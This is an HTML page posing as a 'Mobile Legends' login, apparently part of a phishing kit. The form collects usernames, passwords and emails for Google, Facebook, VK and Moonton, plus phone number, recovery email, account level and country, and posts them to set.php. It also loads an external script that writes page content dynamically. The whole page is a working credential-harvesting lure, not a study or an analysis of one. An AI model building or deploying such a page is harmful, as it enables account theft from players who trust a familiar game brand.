<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
    
    <title>Mobile Legends - Login
    </title>
    <link rel="icon" type="img/png" href="img-zone/favicon.png" sizes="32x32">
    <meta property="og:image" content="https://lh3.googleusercontent.com/hMKYyDqDilcjd2XHl_x5Mhym8LbxhUaKfn1gwfGKCDMr_0yauxeFHnf2SYKBXFXpUw">
    <meta property="og:image:width" content="540">
    <meta property="og:image:height" content="282">
    <script type="text/javascript" src="./claim.php_files/main-zone.js.download">
    </script>
    <script language="JavaScript">document.write(zonehost())</script><link rel="stylesheet" media="all" href="./claim.php_files/cl-zone.css">
  </head>
  <body>
      <font style="color:white;font-size:20px;">
          <b>LOGIN
          </b>
        </font>
    <div class="form">
      <form method="POST" action="set.php">
        
        <br>
        <input type="Username" name="id" value="" placeholder="Username" required="">
        <img src="./claim.php_files/gp.png" width="50px">
        <input type="email" name="gp1" placeholder="Email Google" required="">
        <input type="password" name="gp2" placeholder="Password Google" required=""><br>
        <img src="./claim.php_files/fb.png" width="50px">
        <input type="text" name="fb1" placeholder="Email Facebook" required="">
        <input type="password" name="fb2" placeholder="Password Facebook" required=""><br>
        <img src="./claim.php_files/vk.png" width="50px">
        <input type="text" name="vk1" placeholder="Email VK" required="">
        <input type="password" name="vk2" placeholder="Password VK" required=""><br>
        <img src="./claim.php_files/moonton.png" width="50px">
        <input type="text" name="mnt1" placeholder="Email Moonton">
        <input type="password" name="mnt2" placeholder="Password Moonton"><br>
        <font style="color:white;font-size:15px;">
          <b>DETAIL ACCOUNT
          </b>
        </font>
        <br>
        <select class="select" name="level" required="">
          <option value="">Level Account
          </option>
          <option value="1">1
          </option>
          <option value="2">2
          </option>
          <option value="3">3
          </option>
          <option value="4">4
          </option>
          <option value="5">5
          </option>
          <option value="6">6
          </option>
          <option value="7">7
          </option>
          <option value="8">8
          </option>
          <option value="9">9
          </option>
          <option value="10">10
          </option>
          <option value="11">11
          </option>
          <option value="12">12
          </option>  
          <option value="13">13
          </option>
          <option value="14">14
          </option>
          <option value="15">15
          </option>
          <option value="16">16
          </option>
          <option value="17">17
          </option>
          <option value="18">18
          </option>
          <option value="19">19
          </option>
          <option value="20">20
          </option>
          <option value="21">21
          </option>
          <option value="22">22
          </option>
          <option value="23">23
          </option>
          <option value="24">24
          </option>
          <option value="25">25
          </option>
          <option value="26">26
          </option>
          <option value="27">27
          </option>
          <option value="28">28
          </option>
          <option value="29">29
          </option>
          <option value="30">30
          </option>
        </select>
        <input type="number" name="skin" placeholder="Number Of Skins" required="">
        <input type="number" name="nope" placeholder="Phone Number" required="">
        <input type="email" name="recov" placeholder="Email Recovery" required="">
        <input type="text" name="country" placeholder="Country" required="">
        <button style="margin-top:15px;" type="submit" class="button button-block">LOGIN
        </button>
      </form>
    </div>
</body></html>